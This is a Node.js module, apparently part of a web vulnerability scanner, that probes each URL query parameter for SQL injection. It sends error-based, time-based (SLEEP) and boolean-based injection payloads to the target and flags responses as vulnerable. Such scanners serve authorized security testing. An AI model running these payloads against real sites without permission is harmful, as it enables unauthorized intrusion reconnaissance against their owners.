const c = require("../colors");
const delay = (ms) => new Promise((r) => setTimeout(r, ms));
const ERROR_SIGS = ["you have an error in your sql syntax", "warning: mysql", "unclosed quotation mark", "sqlstate", "pg_query():", "syntax error at or near"];

async function scanSqli(targetUrl) {
  console.log(c.cyan(`\n[*] Memeriksa SQL Injection di: ${targetUrl.slice(0, 50)}...`));
  const results = [];
  let urlObj;
  try { urlObj = new URL(targetUrl); } catch { return results; }
  
  const params = [...urlObj.searchParams.keys()];
  if (params.length === 0) return results;

  for (const param of params) {
    const orig = urlObj.searchParams.get(param) || "";
    
    // 1. Error-Based
    const errUrl = new URL(targetUrl);
    errUrl.searchParams.set(param, orig + "'");
    try {
      const res = await fetch(errUrl.toString());
      const body = (await res.text()).toLowerCase();
      if (ERROR_SIGS.some(s => body.includes(s))) {
        console.log(`  ${c.red("[VULN]")} SQLi Error-based di param "${param}"`);
        results.push({ param, type: "error-based", vulnerable: true });
      }
    } catch {}
    await delay(600);

    // 2. Time-Based Blind
    const timeUrl = new URL(targetUrl);
    timeUrl.searchParams.set(param, orig + "' OR SLEEP(3)-- ");
    try {
      const start = Date.now();
      await fetch(timeUrl.toString(), { signal: AbortSignal.timeout(5000) });
      const elapsed = Date.now() - start;
      if (elapsed >= 2800) {
        console.log(`  ${c.red("[VULN]")} SQLi Time-based di param "${param}" (${elapsed}ms)`);
        results.push({ param, type: "time-based", vulnerable: true });
      }
    } catch {}
    await delay(600);

    // 3. Boolean-Based Blind
    const bTrueUrl = new URL(targetUrl); bTrueUrl.searchParams.set(param, orig + "' AND 1=1-- ");
    const bFalseUrl = new URL(targetUrl); bFalseUrl.searchParams.set(param, orig + "' AND 1=2-- ");
    try {
      const [resT, resF] = await Promise.all([fetch(bTrueUrl.toString()), fetch(bFalseUrl.toString())]);
      const lenT = (await resT.text()).length;
      const lenF = (await resF.text()).length;
      if (Math.abs(lenT - lenF) > 50) {
        console.log(`  ${c.yellow("[LIKELY]")} SQLi Boolean-based di param "${param}" (Beda ${Math.abs(lenT-lenF)} char)`);
        results.push({ param, type: "boolean-based", vulnerable: true });
      }
    } catch {}
    await delay(600);
  }
  return results;
}
module.exports = { scanSqli };